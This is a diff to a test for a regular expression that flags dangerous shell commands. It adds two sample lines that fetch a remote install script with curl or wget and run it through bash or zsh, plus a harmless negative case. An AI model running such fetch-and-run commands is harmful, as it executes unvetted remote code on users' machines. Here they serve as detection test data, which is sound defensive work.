@@ -26,8 +26,10 @@ test("dangerous-command regex", () => {
     "npm install -g example-fake",
     "npm i example-fake --global",
     "iex (New-Object Net.WebClient)",
+    '/bin/bash -c "$(curl -fsSL https://example.invalid/install)"',
+    "zsh -c '$(wget -qO- https://example.invalid/i)'",
   ]) assert.notEqual(matchRule(DANGEROUS, line), null, line);
-  for (const line of ["curl -o file.tgz https://example.invalid", "npm install example-fake", "pnpm add -D vitest", "shell: bash"]) {
+  for (const line of ["curl -o file.tgz https://example.invalid", "npm install example-fake", "pnpm add -D vitest", "shell: bash", 'bash -c "echo $(date)"']) {
     assert.equal(matchRule(DANGEROUS, line), null, line);
   }
 });
